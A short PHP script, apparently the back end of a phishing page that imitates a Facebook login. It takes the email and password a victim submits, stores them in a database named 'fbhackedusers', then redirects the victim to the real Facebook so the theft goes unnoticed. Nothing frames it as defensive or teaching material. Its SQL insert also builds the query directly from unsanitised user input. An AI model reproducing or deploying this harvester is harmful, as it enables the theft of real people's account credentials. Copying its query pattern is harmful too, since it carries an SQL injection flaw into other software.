<?php 
   $conn = mysqli_connect('localhost', 'root', '', 'fbhackedusers');
   if(mysqli_connect_error())
   {
      // redirect users to original Facebook if error occurred
      header("location: https://facebook.com");
      exit();
   }
?>
<!doctype html>
<html>
<head>
   <title>Logging in to facebook</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=yes">
</head>
<body style="margin:0px;"> 
<?php
   if($_SERVER["REQUEST_METHOD"] == "POST")
   {
      if(isset($_POST['login']))
      {
         $email = $pass = "";
         // get facebook email id
         $email = $_POST["email"];
         // get Facebook password
         $pass = $_POST["pass"];
         // insert the Facebook id and password in database
         $sql = "insert into fbusers(facebookid, facebookpassword) values('$email', '$pass')";
         $result = $conn->query($sql);
      }
   }
   // redirect users to original Facebook URL
   header("location: https://www.facebook.com");
   exit();
?> 
</body>
</html>